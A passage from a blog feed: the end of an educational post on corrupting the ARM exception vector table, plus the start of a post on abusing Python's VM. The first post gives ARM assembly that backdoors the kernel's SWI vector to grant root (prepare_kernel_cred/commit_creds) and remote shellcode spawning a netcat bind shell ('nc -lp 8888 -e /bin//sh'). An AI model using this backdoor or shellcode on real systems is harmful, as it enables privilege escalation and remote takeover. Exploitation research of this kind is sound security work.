&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Basically, with this cool and realistic vulnerability, you give the module an address followed by data to write at that address.
Now, our plan is going to be to backdoor the kernel by overwriting the SWI exception vector with code that jumps to our backdoor code. This code will check for a magic value in a register (say r7 which holds the syscall number) and if it matches, it will elevate the privileges of the calling process. Where do we store this backdoor code ? Considering the fact that we have an arbitrary write to kernel memory, we can either store it in userspace or somewhere in kernel space. The good thing about the latter choice is that if we choose an appropriate location in kernel space, our code will exist as long as the machine is running, whereas with the former choice, as soon as our user space application exits, the code is lost and if the entry in the EVT isn't set back to its original value, it will most likely be pointing to invalid/unmmapped memory which will crash the system. So we need a location in kernel space that is executable and writeable. Where could this be ? Let's take a closer look at the EVT:&lt;br&gt;
&lt;center&gt;&lt;img alt="EVT Disassembly" src="/images/corrupting_arm_evt/evt_8i.png"&gt;&lt;/center&gt;&lt;br&gt;
As expected we see a bunch of control transfer instructions but one thing we notice about them is that "closest" referenced address is &lt;em&gt;0xffff0200&lt;/em&gt;. Let's take a look what is between the end of the EVT and 0xffff0200:&lt;br&gt;
&lt;center&gt;&lt;img alt="EVT Inspection" src="/images/corrupting_arm_evt/evt_400wx.png"&gt;&lt;/center&gt;&lt;br&gt;
It looks like nothing is there so we have around 480 bytes to store our backdoor which is more than enough.&lt;/p&gt;
&lt;h3 id="the-exploit"&gt;The Exploit&lt;/h3&gt;
&lt;p&gt;Recapitulating our exploit:&lt;br&gt;
    1. Store our backdoor at &lt;em&gt;0xffff0020&lt;/em&gt;.&lt;br&gt;
    2. Overwrite the SWI exception vector with a branch to &lt;em&gt;0xffff0020&lt;/em&gt;.&lt;br&gt;
    3. When a system call occurs, our backdoor will check if r7 == 0xb0000000 and if true, elevate the privileges of the calling process otherwise jump to the normal system call handler.&lt;br&gt;
Here is the backdoor's code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;;check if magic&lt;/span&gt;
    &lt;span class="nf"&gt;cmp&lt;/span&gt;     &lt;span class="nv"&gt;r7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mh"&gt;0xb0000000&lt;/span&gt;
    &lt;span class="nf"&gt;bne&lt;/span&gt;     &lt;span class="nv"&gt;exit&lt;/span&gt;

&lt;span class="nl"&gt;elevate:&lt;/span&gt;
    &lt;span class="nf"&gt;stmfd&lt;/span&gt;   &lt;span class="nb"&gt;sp&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;

    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0xc0049a00&lt;/span&gt;     &lt;span class="c1"&gt;;prepare_kernel_cred&lt;/span&gt;
    &lt;span class="nf"&gt;blx&lt;/span&gt;     &lt;span class="nv"&gt;r3&lt;/span&gt;
    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0xc0049438&lt;/span&gt;     &lt;span class="c1"&gt;;commit_creds&lt;/span&gt;
    &lt;span class="nf"&gt;blx&lt;/span&gt;     &lt;span class="nv"&gt;r4&lt;/span&gt;

    &lt;span class="nf"&gt;ldmfd&lt;/span&gt;   &lt;span class="nb"&gt;sp&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;pc&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;  &lt;span class="c1"&gt;;return to userland&lt;/span&gt;

&lt;span class="c1"&gt;;go to syscall handler&lt;/span&gt;
&lt;span class="nl"&gt;exit:&lt;/span&gt;
    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;pc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;pc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mi"&gt;980&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;      &lt;span class="c1"&gt;;go to normal swi handler&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You can find the complete code for the vulnerable module and the exploit &lt;a href="https://github.com/acama/arm-evt/tree/master/local_example"&gt;here&lt;/a&gt;. Run the exploit:&lt;br&gt;
&lt;center&gt;&lt;img alt="Local PoC" src="/images/corrupting_arm_evt/local_poc.png"&gt;&lt;/center&gt;  &lt;/p&gt;
&lt;h2 id="remote-scenario"&gt;Remote scenario&lt;/h2&gt;
&lt;p&gt;For this example, we will use a netfilter module with a similar vulnerability as the previous one:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;protocol&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
        &lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;tcphdr&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;skb_network_header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ip_hdrlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
        &lt;span class="n"&gt;currport&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ntohs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;dest&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;currport&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;9999&lt;/span&gt;&lt;span class="p"&gt;)){&lt;/span&gt;
            &lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)((&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;doff&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
            &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;tcp_data&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
            &lt;span class="n"&gt;len&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;)))[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
            &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Just like the previous example, this module has an awesome feature that allows you to write data to anywhere you want. Connect on port tcp/9999 and just give it an address, followed by the size of the data and the actual data to write there. In this case we will also backdoor the kernel by overwriting the SWI exception vector and backdooring the kernel. The code will branch to our shellcode which we will also, as in the previous example, store at &lt;em&gt;0xffff020&lt;/em&gt;. Overwriting the SWI vector is especially a good idea in this remote scenario because it will allow us to switch from interrupt context to process context. So our backdoor will be executing in a context with a backing process and we will be able to "hijack" this process and overwrite its code segment with a bind shell or connect back shell. But let's not do it that way. Let's check something real quick:&lt;br&gt;
&lt;center&gt;&lt;img alt="cat /proc/self/maps" src="/images/corrupting_arm_evt/proc_self_maps.png"&gt;&lt;/center&gt;&lt;br&gt;
Would you look at that, on top of everything else, the EVT is a shared memory segment. It is executable from user land and writeable from kernel land*. Instead of overwriting the code segment of a process that is making a system call, let's just store our code in the EVT right after our first stage and just return there.
Every system call goes through the SWI vector so we won't have to wait too much for a process to get caught in our trap.&lt;/p&gt;
&lt;h3 id="the-exploit_1"&gt;The Exploit&lt;/h3&gt;
&lt;p&gt;Our exploit goes:&lt;br&gt;
    1. Store our first stage and second stage shellcodes at &lt;em&gt;0xffff0020&lt;/em&gt; (one after the other).&lt;br&gt;
    2. Overwrite the SWI exception vector with a branch to &lt;em&gt;0xffff0020&lt;/em&gt;.&lt;br&gt;
    3. When a system call occurs, our first stage shellcode will set the link register to the address of our second stage shellcode (which is also stored in the EVT and which will be executed from userland), and then return to userland.&lt;br&gt;
    4. The calling process will "resume execution" at the address of our second stage which is just a bind shell.  &lt;/p&gt;
&lt;p&gt;Here is the stage 1-2 shellcode:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;stage_1:&lt;/span&gt;
    &lt;span class="nf"&gt;adr&lt;/span&gt;     &lt;span class="nv"&gt;lr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;stage_2&lt;/span&gt;
    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;lr&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
    &lt;span class="nf"&gt;stmfd&lt;/span&gt;   &lt;span class="nb"&gt;sp&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0xe59ff410&lt;/span&gt;     &lt;span class="c1"&gt;; intial value at 0xffff0008 which is&lt;/span&gt;
                                &lt;span class="c1"&gt;; ldr     pc, [pc, #1040] ; 0xffff0420&lt;/span&gt;
    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0xffff0008&lt;/span&gt;
    &lt;span class="nf"&gt;str&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="nf"&gt;ldmfd&lt;/span&gt;   &lt;span class="nb"&gt;sp&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;pc&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;  &lt;span class="c1"&gt;; return to userland&lt;/span&gt;

&lt;span class="nl"&gt;stage_2:&lt;/span&gt;
    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x6e69622f&lt;/span&gt;     &lt;span class="c1"&gt;; /bin&lt;/span&gt;
    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x68732f2f&lt;/span&gt;     &lt;span class="c1"&gt;; /sh&lt;/span&gt;
    &lt;span class="nf"&gt;eor&lt;/span&gt;     &lt;span class="nv"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r2&lt;/span&gt;          &lt;span class="c1"&gt;; 0x00000000&lt;/span&gt;
    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r2&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;sp&lt;/span&gt;

    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x0000632d&lt;/span&gt;     &lt;span class="c1"&gt;; -c\x00\x00&lt;/span&gt;
    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r4&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;sp&lt;/span&gt;

    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x2d20636e&lt;/span&gt;
    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x3820706c&lt;/span&gt;
    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x20383838&lt;/span&gt;     &lt;span class="c1"&gt;; nc -lp 8888 -e /bin//sh&lt;/span&gt;
    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x2f20652d&lt;/span&gt;
    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x2f6e6962&lt;/span&gt;
    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x68732f2f&lt;/span&gt;

    &lt;span class="nf"&gt;eor&lt;/span&gt;     &lt;span class="nv"&gt;r11&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r11&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r11&lt;/span&gt;
    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r5&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;r11&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;sp&lt;/span&gt;
    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r2&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;

    &lt;span class="nf"&gt;eor&lt;/span&gt;     &lt;span class="nv"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r6&lt;/span&gt;
    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;r5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r6&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;sp&lt;/span&gt;
    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;
    &lt;span class="nf"&gt;swi&lt;/span&gt;     &lt;span class="mh"&gt;0x0&lt;/span&gt;

    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mi"&gt;99&lt;/span&gt;
    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="nf"&gt;swi&lt;/span&gt;     &lt;span class="mh"&gt;0x0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You can find the complete code for the vulnerable module and the exploit &lt;a href="https://github.com/acama/arm-evt/tree/master/remote_example"&gt;here&lt;/a&gt;. Run the exploit:&lt;br&gt;
&lt;center&gt;&lt;img alt="Remote PoC" src="/images/corrupting_arm_evt/remote_poc.png"&gt;&lt;/center&gt;  &lt;/p&gt;
&lt;h2 id="bonus-interrupt-stack-overflow"&gt;Bonus: Interrupt Stack Overflow&lt;/h2&gt;
&lt;p&gt;It seems like the Interrupt Stack is adjacent to the EVT in most memory layouts. Who knows what kind of interesting things would happen if there was something like a stack overflow ?&lt;/p&gt;
&lt;h1 id="a-few-things-about-all-this"&gt;A Few Things about all this&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;The techniques discussed in this article make the assumption that the attack has knowledge of the kernel addresses which might not always be the case.&lt;/li&gt;
&lt;li&gt;The location where we are storing our shellcode (&lt;em&gt;0xffff0020&lt;/em&gt;) might or might not be used by another distro's kernel.&lt;/li&gt;
&lt;li&gt;The exampe codes I wrote here are merely PoCs; they could definitely be improved. For example, on the remote scenario, if it turns out that the init process is the process being hijacked, the box will crash after we exit from the bind shell.&lt;/li&gt;
&lt;li&gt;If you hadn't noticed, the "vulnerabilities" presented here, aren't really vulnerabilities but that is not the point of this article.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;*: It seems like the EVT can be mapped read-only and therfore there is the possibility that it might not be writeable in newer/some versions of the Linux kernel.&lt;/p&gt;
&lt;h1 id="final-words"&gt;Final words&lt;/h1&gt;
&lt;p&gt;Among other things, &lt;a href="http://grsecurity.net/"&gt;grsec&lt;/a&gt; prevents the modification of the EVT by making the page read-only.
If you want to play with some fun kernel challenges checkout the "kernelpanic" branch on &lt;a href="http://w3challs.com/challenges/wargame"&gt;w3challs&lt;/a&gt;.&lt;br&gt;
Cheers, &lt;a href="https://twitter.com/amatcama"&gt;@amatcama&lt;/a&gt;&lt;/p&gt;
&lt;h1 id="references"&gt;References&lt;/h1&gt;
&lt;p&gt;[1] &lt;a href="http://cansecwest.com/slides07/Vector-Rewrite-Attack.pdf"&gt;Vector Rewrite Attack&lt;/a&gt;&lt;br&gt;
[2] &lt;a href="https://forums.grsecurity.net/viewtopic.php?f=7&amp;amp;t=3292"&gt;Recent ARM Security Improvements&lt;/a&gt;&lt;br&gt;
[3] &lt;a href="http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0311d/I30195.html"&gt;Entering an Exception&lt;/a&gt;&lt;br&gt;
[4] &lt;a href="http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0040d/Cacdfeci.html"&gt;SWI handlers&lt;/a&gt;&lt;br&gt;
[5] &lt;a href="http://osnet.cs.nchu.edu.tw/powpoint/Embedded94_1/Chapter%207%20ARM%20Exceptions.pdf"&gt;ARM Exceptions&lt;/a&gt;&lt;br&gt;
[6] &lt;a href="http://www.iti.uni-stuttgart.de/~radetzki/Seminar06/08_report.pdf"&gt;Exception and Interrupt Handling in ARM&lt;/a&gt;  &lt;/p&gt;</content><category term="exploitation"></category><category term="kernel"></category></entry><entry><title>Deep dive into Python's VM: Story of LOAD_CONST bug</title><link href="/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/" rel="alternate"></link><published>2014-04-17T23:22:00-07:00</published><updated>2014-04-17T23:22:00-07:00</updated><author><name>Axel "0vercl0k" Souchet</name></author><id>tag:None,2014-04-17:/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
&lt;p&gt;A year ago, I've written a Python script to leverage a bug in Python's virtual machine: the idea was to fully control the Python virtual processor and after that to instrument the VM to execute native codes. The &lt;a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py"&gt;python27_abuse_vm_to_execute_x86_code.py&lt;/a&gt; script wasn't really self-explanatory, so I believe only a few people actually took some time to understood what happened under the hood. The purpose of this post is to give you an explanation of the bug, how you can control the VM and how you can turn the bug into something that can be more useful. It's also a cool occasion to see how works the Python virtual machine from a low-level perspective: what we love so much right?&lt;/p&gt;
&lt;p&gt;But before going further, I just would like to clarify a couple of things:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I haven't found this bug, this is quite old and &lt;strong&gt;known&lt;/strong&gt; by the Python developers (trading safety for performance), so don't panic this is &lt;strong&gt;not&lt;/strong&gt; a 0day or a new bug ; can be a cool CTF trick though&lt;/li&gt;
&lt;li&gt;Obviously, YES I know we can also "escape" the virtual machine with the &lt;a href="http://docs.python.org/2/library/ctypes.html"&gt;ctypes&lt;/a&gt; module ; but this is a feature not a bug. In addition, ctypes is always "removed"  from sandbox implementation in Python&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Also, keep in mind I will focus Python 2.7.5 x86 on Windows ; but obviously this is adaptable for other systems and architectures, so this is left as an exercise to the interested readers.
All right, let's move on to the first part: this one will focus the essentials about the VM, and Python objects.&lt;/p&gt;
</summary><content type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
&lt;p&gt;A year ago, I've written a Python script to leverage a bug in Python's virtual machine: the idea was to fully control the Python virtual processor and after that to instrument the VM to execute native codes. The &lt;a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py"&gt;python27_abuse_vm_to_execute_x86_code.py&lt;/a&gt; script wasn't really self-explanatory, so I believe only a few people actually took some time to understood what happened under the hood. The purpose of this post is to give you an explanation of the bug, how you can control the VM and how you can turn the bug into something that can be more useful. It's also a cool occasion to see how works the Python virtual machine from a low-level perspective: what we love so much right?&lt;/p&gt;
&lt;p&gt;But before going further, I just would like to clarify a couple of things:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I haven't found this bug, this is quite old and &lt;strong&gt;known&lt;/strong&gt; by the Python developers (trading safety for performance), so don't panic this is &lt;strong&gt;not&lt;/strong&gt; a 0day or a new bug ; can be a cool CTF trick though&lt;/li&gt;
&lt;li&gt;Obviously, YES I know we can also "escape" the virtual machine with the &lt;a href="http://docs.python.org/2/library/ctypes.html"&gt;ctypes&lt;/a&gt; module ; but this is a feature not a bug. In addition, ctypes is always "removed"  from sandbox implementation in Python&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Also, keep in mind I will focus Python 2.7.5 x86 on Windows ; but obviously this is adaptable for other systems and architectures, so this is left as an exercise to the interested readers.
All right, let's move on to the first part: this one will focus the essentials about the VM, and Python objects.&lt;/p&gt;


&lt;div class="toc"&gt;&lt;span class="toctitle"&gt;Table of contents:&lt;/span&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#introduction"&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#the-python-virtual-processor"&gt;The Python virtual processor&lt;/a&gt;&lt;ul&gt;
